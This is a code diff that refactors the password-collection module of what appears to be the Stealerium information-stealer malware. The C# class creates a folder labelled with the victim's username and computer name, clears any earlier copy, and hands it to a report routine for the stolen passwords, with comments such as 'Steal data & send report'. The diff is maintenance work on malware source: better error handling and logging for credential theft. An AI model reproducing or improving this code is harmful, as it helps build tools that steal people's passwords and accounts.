@@ -7,27 +7,45 @@ namespace Stealerium.Target
 {
     internal sealed class Passwords
     {
-        // Stealer modules
+        // Directory to store passwords
         private static readonly string PasswordsStoreDirectory = Path.Combine(
             Paths.InitWorkDir(),
-            SystemInfo.Username + "@" + SystemInfo.Compname + "_" + SystemInfo.Culture);
+            $"{SystemInfo.Username}@{SystemInfo.Compname}_{SystemInfo.Culture}");
 
         // Steal data & send report
         public static string Save()
         {
-            Console.WriteLine("Running passwords recovery...");
-            if (!Directory.Exists(PasswordsStoreDirectory)) Directory.CreateDirectory(PasswordsStoreDirectory);
-            else
+            Logging.Log("Running passwords recovery...");
+
+            try
+            {
+                PreparePasswordStoreDirectory();
+                return Report.CreateReport(PasswordsStoreDirectory) ? PasswordsStoreDirectory : string.Empty;
+            }
+            catch (Exception ex)
+            {
+                Logging.Log($"Stealer >> Failed to save passwords: {ex.Message}");
+                return string.Empty;
+            }
+        }
+
+        // Prepares the password storage directory
+        private static void PreparePasswordStoreDirectory()
+        {
+            if (Directory.Exists(PasswordsStoreDirectory))
+            {
                 try
                 {
                     Filemanager.RecursiveDelete(PasswordsStoreDirectory);
                 }
-                catch
+                catch (Exception ex)
                 {
-                    Logging.Log("Stealer >> Failed recursive remove directory with passwords");
+                    Logging.Log($"Stealer >> Failed to recursively delete the directory: {ex.Message}");
+                    throw;
                 }
+            }
 
-            return Report.CreateReport(PasswordsStoreDirectory) ? PasswordsStoreDirectory : "";
+            Directory.CreateDirectory(PasswordsStoreDirectory);
         }
     }
 }
